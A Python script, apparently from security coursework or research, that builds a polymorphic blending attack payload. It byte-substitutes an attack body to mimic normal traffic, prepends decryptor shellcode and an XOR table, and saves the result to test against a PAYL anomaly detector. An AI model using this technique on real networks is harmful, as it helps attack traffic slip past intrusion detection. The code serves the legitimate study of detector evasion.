import sys
import configparser
import cPickle as pkl

import substitution
import padding

def usage():
    sys.stderr.write('usage: python pba.py pba.cfg\n')
    sys.exit(2)

def _main():
    if len(sys.argv) != 2:
        usage()

    configFN = sys.argv[1]

    # Read config file
    config = configparser.ConfigParser()
    config.read(configFN)

    # Parse parameters
    artificial_path = str(config['pba']['artificial_payload'])
    attackbody_path = str(config['pba']['attack_payload'])
    output_path = str(config['pba']['output_payload'])

    # Read in source pcap file and extract tcp payload
    attack_payload = substitution.getAttackBodyPayload(attackbody_path)
    artificial_payload = substitution.getArtificialPayload(artificial_path)

    # Generate substitution table based on byte frequency in file
    substitution_table = substitution.getSubstitutionTable(artificial_payload, attack_payload)

    # Substitution table will be used to encrypt attack body and generate corresponding xor_table which will be used to decrypt the attack body
    (xor_table, adjusted_attack_body) = substitution.substitute(attack_payload, substitution_table)

    # Pad xor table to a multiple of 4
    # For xor operation, should be a multiple of 4
    while len(xor_table) < 128:  # CHECK: 128 can be some other number (greater than and multiple of 4) per your attack trace length
        xor_table.append(chr(0))

    # For xor operation, should be a multiple of 4
    while len(adjusted_attack_body) < 128: # CHECK: 128 can be some other number (greater than and multiple of 4) per your attack trace length
        adjusted_attack_body.append(chr(0))

    # Read in decryptor binary to append at the start of payload
    with open('shellcode.bin', 'rb') as fr:
        shellcode_content = fr.read()

    # Prepare byte list for payload
    byte = list()
    for b in shellcode_content:
        byte.append(b)

    # Raw payload will be constructed by encrypted attack body and xor_table
    raw_payload = byte + adjusted_attack_body + xor_table
    while len(raw_payload) < len(artificial_payload):
        padding.padding(artificial_payload, raw_payload)

    # Write prepared payload to Output file and test against your PAYL model
    with open(output_path, 'wb') as fw:
        # Number of payloads
        pkl.dump(1,fw)
        pkl.dump((''.join(raw_payload),'1'),fw)

    # Write payload.bin to check
    with open('verify/payload.bin','wb') as fw:
        fw.write(''.join(adjusted_attack_body+xor_table))

if __name__ == '__main__':
    _main()
